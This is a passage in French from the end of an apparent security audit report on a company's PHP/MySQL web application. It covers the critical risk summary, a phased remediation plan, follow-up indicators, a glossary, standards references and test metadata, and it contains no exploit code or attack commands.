- **Base de données complète** exploitable sans authentification
- **Aucune protection** contre les attaques courantes (OWASP Top 10)

**Conformité:**
- **Non-conforme** RGPD Article 32 (sécurité)
- **Non-conforme** Loi 09-08 Article 23 (mesures de sécurité)
- Risque d'amende: Jusqu'à 4% CA ou 20M€

**Risque principal:**
Compromission totale possible en moins de 60 secondes via SQL Injection non authentifiée (V01).

### 7.2 Axes stratégiques de remédiation

**Axe 1: Correction urgente des vulnérabilités critiques**
- V01, V03, V04: Correction dans les 48 heures
- Impact: Élimination de 75% du risque global

**Axe 2: Renforcement structurel**
- Architecture sécurisée (séparation des couches)
- Principe de moindre privilège
- Défense en profondeur

**Axe 3: Conformité réglementaire**
- Mise en conformité RGPD/Loi 09-08
- Documentation des mesures de sécurité
- Procédures de notification

**Axe 4: Surveillance et détection**
- Mise en place logging sécurité
- Monitoring temps réel
- Alertes automatiques

**Axe 5: Gouvernance et formation**
- Politique de sécurité formalisée
- Formation développeurs (Secure Coding)
- Revue de code systématique

### 7.3 Priorisation stratégique

**Phase 1: Urgence (0-7 jours)**
- Objectif: Éliminer le risque critique
- Actions: Correction V01, V03, V04
- Validation: Tests de non-régression

**Phase 2: Consolidation (7-30 jours)**
- Objectif: Sécuriser l'ensemble
- Actions: Correction V02, V05, V06
- Validation: Audit de sécurité complet

**Phase 3: Amélioration continue (30+ jours)**
- Objectif: Prévention
- Actions: WAF, monitoring, formation
- Validation: Tests périodiques

### 7.4 Indicateurs de suivi

**Indicateurs de vulnérabilités:**
- Nombre de vulnérabilités critiques: Objectif 0
- Nombre total de vulnérabilités: Objectif 0
- Temps moyen de correction: < 7 jours

**Indicateurs de conformité:**
- Conformité RGPD Article 32: Objectif 100%
- Documentation sécurité: Objectif complète
- Formation équipe: Objectif 100% formés

**Indicateurs de détection:**
- Couverture logging: Objectif 100%
- Temps détection incident: Objectif < 1h
- Faux positifs: Objectif < 5%

### 7.5 Référence aux chapitres suivants

**Pour les détails techniques d'implémentation:**
- Chapitre 15: Sécurité Applicative (solutions techniques)
- Chapitre 16: Sécurité Base de Données
- Chapitre 17: Contrôle d'Accès

**Pour les tests et validations:**
- Chapitre 21: Tests d'Intrusion (preuves de concept, exploitations)

**Pour la surveillance:**
- Chapitre 19: Monitoring & Honeypot

---

## Annexes

### Annexe A: Glossaire

**CIA Triad:** Confidentiality, Integrity, Availability - Les trois piliers de la sécurité de l'information.

**CVSS:** Common Vulnerability Scoring System - Système standardisé de notation des vulnérabilités.

**IDOR:** Insecure Direct Object Reference - Accès non autorisé à des objets via leur référence directe.

**Mass Assignment:** Modification non autorisée de propriétés d'objet via paramètres de requête.

**OWASP:** Open Web Application Security Project - Organisation de référence en sécurité web.

**Payload:** Code malveillant injecté pour exploiter une vulnérabilité.

**RGPD:** Règlement Général sur la Protection des Données.

**SQL Injection:** Injection de requêtes SQL malveillantes via des entrées non validées.

**XSS:** Cross-Site Scripting - Injection de code JavaScript malveillant.

### Annexe B: Références normatives

**Standards de sécurité:**
- OWASP Top 10 2021
- NIST SP 800-115: Technical Guide to Information Security Testing
- ISO/IEC 27001:2013: Systèmes de management de la sécurité de l'information

**Réglementations:**
- RGPD (UE) 2016/679
- Loi marocaine 09-08 relative à la protection des personnes physiques

**Systèmes de notation:**
- CVSS v3.1 Specification Document (FIRST)
- CWE/SANS Top 25 Most Dangerous Software Errors

### Annexe C: Métadonnées de l'évaluation

**Informations générales:**
- Organisation: AtlasTech Solutions
- Périmètre: Application web + Module CRUD RH
- Date: 13-14 février 2026
- Méthodologie: OWASP Testing Guide v4.2

**Environnement technique:**
- Serveur: Ubuntu 24.04 LTS (192.168.112.141)
- Stack: LAMP (Linux, Apache, MySQL, PHP)
- Application: PHP 8.3, MySQL 8.0

**Limitations:**
- Tests effectués en environnement de développement
- Pas de tests destructifs (DROP, DELETE)
- Analyse de code statique uniquement (pas d'accès au code complet)

---

**Fin du Chapitre 6**

**Note:** Les détails techniques d'exploitation, preuves de concept (PoC), et procédures de tests sont documentés dans le Chapitre 21 - Tests d'Intrusion.